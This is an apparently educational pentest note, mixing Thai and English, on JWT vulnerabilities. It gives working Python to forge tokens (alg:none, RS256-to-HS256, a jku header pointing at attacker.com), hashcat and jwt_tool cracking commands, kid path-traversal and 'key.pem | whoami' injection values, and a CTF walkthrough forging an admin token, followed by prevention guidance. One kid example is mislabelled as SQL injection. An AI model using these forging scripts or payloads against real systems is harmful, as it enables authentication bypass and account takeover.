# JWT Vulnerabilities

## What is JWT?
JSON Web Token (JWT) เป็นมาตรฐาน open standard (RFC 7519) สำหรับการส่งผ่านข้อมูลระหว่าง parties ในรูปแบบ JSON object ที่มีการลงนาม digitally ซึ่งสามารถ verify และ trust ได้

JWT ประกอบด้วย 3 ส่วนหลัก:
- **Header**: ระบุ algorithm และ type ของ token
- **Payload**: ข้อมูลที่ต้องการส่ง (claims)
- **Signature**: ลายเซ็นดิจิทัลเพื่อ verify ความถูกต้อง

รูปแบบ: `header.payload.signature`

> [!info] JWT Structure
> JWT จะถูก encode ด้วย Base64URL และแยกด้วย dot (.) เช่น:
> `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

## Landmark
JWT vulnerabilities มักพบใน:
- Authentication systems ที่ใช้ JWT เป็น session token
- API authentication endpoints (`/api/login`, `/oauth/token`)
- Authorization headers: `Authorization: Bearer <JWT>`
- Cookie storage: `jwt=<token>`
- Single Sign-On (SSO) implementations
- Mobile app authentication
- Microservices architecture ที่ใช้ JWT ระหว่าง services

**Detection Points:**
```
HTTP/1.1 200 OK
Set-Cookie: jwt=eyJhbGci...
Authorization: Bearer eyJhbGci...
```

## Types of JWT Vulnerabilities

### 1. Algorithm Confusion (alg: none)
การเปลี่ยน algorithm เป็น "none" เพื่อ bypass signature verification

**Attack Vector:**
```json
// Original Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Modified Header
{
  "alg": "none",
  "typ": "JWT"
}
```

**Exploitation:**
```python
import base64
import json

# Create header with alg: none
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator"}

# Encode without signature
encoded_header = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

encoded_payload = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# JWT with empty signature
jwt_token = f"{encoded_header}.{encoded_payload}."
print(jwt_token)
```

> [!warning] Algorithm None Attack
> บาง JWT libraries จะยอมรับ `alg: none` และข้าม signature verification ทั้งหมด ทำให้ attacker สามารถ forge JWT ได้ตามต้องการ

### 2. Weak Secret Key
การ brute force หรือ crack secret key ที่ใช้ sign JWT

**Tools:**
```bash
# jwt_tool - JWT cracking
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat - JWT cracking
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# john the ripper
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**Common Weak Secrets:**
- "secret"
- "password"
- "123456"
- Application name
- Default credentials

**Example:**
```bash
# Using jwt_tool to crack
python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt

# Output: Secret found: mysecretkey
```

### 3. Algorithm Confusion (RS256 to HS256)
เปลี่ยน algorithm จาก RS256 (asymmetric) เป็น HS256 (symmetric) และใช้ public key เป็น secret key

**Concept:**
- RS256 ใช้ private key สำหรับ sign และ public key สำหรับ verify
- HS256 ใช้ secret key เดียวกันทั้ง sign และ verify
- ถ้า server ไม่ check algorithm อย่างเข้มงวด จะใช้ public key เป็น HMAC secret ได้

**Attack Steps:**
```python
import jwt

# 1. Get public key from server
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 2. Create payload
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# 3. Sign with HS256 using public key as secret
forged_token = jwt.encode(
    payload,
    key=public_key,
    algorithm="HS256"
)

print(forged_token)
```

> [!tip] RS256 to HS256 Attack
> การโจมตีนี้ใช้ได้เมื่อ:
> 1. Server ไม่ enforce algorithm type
> 2. Public key สามารถเข้าถึงได้ (มักเปิดเผยใน `/jwks.json` หรือ `/.well-known/jwks.json`)
> 3. Server ใช้ public key เป็น HMAC secret เมื่อเจอ HS256

### 4. JWT Header Parameter Injection
การแทรก parameters ใน JWT header เพื่อ manipulate key loading

**Vulnerable Parameters:**
- `jku` (JWK Set URL): URL ที่มี public keys
- `jwk` (JSON Web Key): Embed public key ใน header
- `kid` (Key ID): ระบุ key ที่ใช้ verify
- `x5u` (X.509 URL): URL ของ certificate chain

**jku Attack:**
```json
// Modified JWT Header
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

**Exploitation:**
```python
# 1. Create own key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

# 2. Host malicious JWKS
jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "kid": "attacker-key",
        "n": "<modulus>",
        "e": "AQAB"
    }]
}

# 3. Create JWT with jku pointing to attacker server
import jwt

payload = {"sub": "admin", "role": "administrator"}
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json"
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
```

**kid Attack (Path Traversal):**
```json
// SQL Injection in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../dev/null"
}

// Path Traversal
{
  "kid": "../../../public/css/style.css"
}

// Command Injection
{
  "kid": "key.pem | whoami"
}
```

### 5. None Signature Validation
Server ไม่ validate signature อย่างถูกต้อง

**Test Cases:**
```bash
# 1. Remove signature completely
eyJhbGci...eyJzdWI...

# 2. Empty signature
eyJhbGci...eyJzdWI....

# 3. Invalid signature
eyJhbGci...eyJzdWI...AAAAA

# 4. Change payload without re-signing
# Modify payload then send with old signature
```

### 6. Token Expiration Issues
JWT ไม่มี expiration หรือ server ไม่ check `exp` claim

**Check Payload:**
```json
{
  "sub": "user123",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622  // Check if expired tokens still work
}
```

**Exploitation:**
```bash
# Test with expired token
curl -H "Authorization: Bearer <expired_jwt>" https://target.com/api/admin

# Test without exp claim
# Remove exp claim and re-sign
```

## Exploitation Techniques

### JWT Decode and Analysis
```bash
# Manual decode
echo "eyJhbGci..." | base64 -d

# Using jwt_tool
python3 jwt_tool.py <JWT>

# Using jwt.io (online)
# Paste JWT to https://jwt.io/

# Using jq
echo '<JWT>' | cut -d. -f2 | base64 -d | jq
```

### JWT Manipulation
```python
import jwt
import json
import base64

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def create_jwt(header, payload, secret=''):
    """Create new JWT"""
    if header.get('alg') == 'none':
        encoded_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        encoded_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        return f"{encoded_header}.{encoded_payload}."
    else:
        return jwt.encode(payload, secret, algorithm=header['alg'], headers=header)

# Example usage
token = "eyJhbGci..."
header, payload = decode_jwt(token)

# Modify payload
payload['role'] = 'admin'
payload['sub'] = 'admin@example.com'

# Create new token
new_token = create_jwt(header, payload, secret='cracked_secret')
```

### Automated Testing
```bash
# jwt_tool - comprehensive testing
python3 jwt_tool.py <JWT> -M at -t "https://target.com/api/validate"

# Options:
# -M at : All tests
# -M pb : Playbook scan
# -t    : Target URL for validation
# -rc   : Include cookies
# -rh   : Include headers

# Example with cookies and headers
python3 jwt_tool.py <JWT> \
  -M at \
  -t "https://target.com/api/user" \
  -rc "session=abc123" \
  -rh "X-API-Key: xyz"
```

## Related Topics
- [[Authentication Bypass]] - การ bypass authentication mechanisms
- [[Session Management]] - การจัดการ sessions และ tokens
- [[API Security]] - API authentication vulnerabilities
- [[Cryptography]] - Cryptographic weaknesses
- [[CORS Misconfiguration]] - Cross-origin issues with JWT APIs
- [[OAuth]] - OAuth และ JWT integration

## Tools

### JWT Analysis
- **jwt_tool**: Swiss army knife for JWT testing
- **jwt.io**: Online JWT decoder/encoder
- **jwt-cracker**: Node.js JWT brute forcer
- **c-jwt-cracker**: Fast C implementation for cracking

### JWT Cracking
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Install jwt-cracker
npm install -g jwt-cracker

# Usage
jwt-cracker <JWT> [alphabet] [max-length]
jwt-cracker eyJhbGci... "abcdefghijklmnopqrstuvwxyz" 6
```

### Burp Suite Extensions
- **JSON Web Token Attacker**: JWT manipulation
- **JWT Editor**: Advanced JWT editing and signing
- **Autorize**: Authorization testing with JWTs

## CTF Example: JWT Secret Cracking

**Scenario:** Web application ใช้ JWT สำหรับ authentication แต่ใช้ weak secret key

**Challenge:**
```
URL: http://ctf.example.com:8080/
Login: guest / guest
Goal: Access admin dashboard at /admin
```

**Solution:**

1. **Login and capture JWT:**
```bash
curl -X POST http://ctf.example.com:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}'

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxODY0MDAwMH0.K8Zr5vJxQ3v_YYhN9X7wP5nL2mQr1sT6uV8wX9yZ0aA"
}
```

2. **Decode JWT:**
```bash
echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxODY0MDAwMH0" | base64 -d | jq

# Output:
{
  "user": "guest",
  "role": "user",
  "exp": 1718640000
}
```

3. **Crack secret key:**
```bash
python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt

# Output:
[+] Secret found: ctf2024
```

4. **Forge admin JWT:**
```python
import jwt

payload = {
    "user": "admin",
    "role": "admin",
    "exp": 9999999999
}

token = jwt.encode(payload, "ctf2024", algorithm="HS256")
print(token)
```

5. **Access admin dashboard:**
```bash
curl http://ctf.example.com:8080/admin \
  -H "Authorization: Bearer <forged_token>"

# Success! Flag: CTF{JWT_s3cr3t_cr4ck1ng_mast3r}
```

> [!success] Key Takeaways
> 1. Always test for weak JWT secrets ด้วย common wordlists
> 2. Check algorithm confusion vulnerabilities (`alg: none`, RS256→HS256)
> 3. Analyze JWT payload สำหรับ privilege escalation opportunities
> 4. Test signature validation และ expiration enforcement
> 5. Look for JWT header parameter injection (jku, jwk, kid)

## Prevention

### Secure JWT Implementation
```python
import jwt
from datetime import datetime, timedelta
import secrets

# 1. Use strong secret key
SECRET_KEY = secrets.token_hex(32)  # 256-bit random key

# 2. Always specify algorithm explicitly
def create_token(user_id, role):
    payload = {
        'sub': user_id,
        'role': role,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=1),
        'nbf': datetime.utcnow()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# 3. Strict verification
def verify_token(token):
    try:
        # Explicitly specify algorithms
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],  # Whitelist only expected algorithms
            options={
                'verify_signature': True,
                'verify_exp': True,
                'verify_nbf': True,
                'require': ['exp', 'iat', 'sub']
            }
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

### Best Practices
1. **Never** accept `alg: none`
2. Use strong, randomly generated secrets (minimum 256 bits)
3. Always verify signatures
4. Enforce short expiration times
5. Implement token refresh mechanisms
6. Use algorithm whitelisting
7. Validate all JWT claims (exp, nbf, iat, iss, aud)
8. Don't store sensitive data in JWT payload
9. Use HTTPS only for JWT transmission
10. Implement token revocation/blacklist for critical actions

## References
- JWT.io - JSON Web Tokens Introduction
- RFC 7519 - JSON Web Token (JWT)
- OWASP JWT Cheat Sheet
- PortSwigger JWT Attacks
- jwt_tool Documentation

---
**Tags:** #jwt #authentication #web #api #cryptography #token
**Difficulty:** Medium to Hard
**OWASP:** A07:2021 – Identification and Authentication Failures
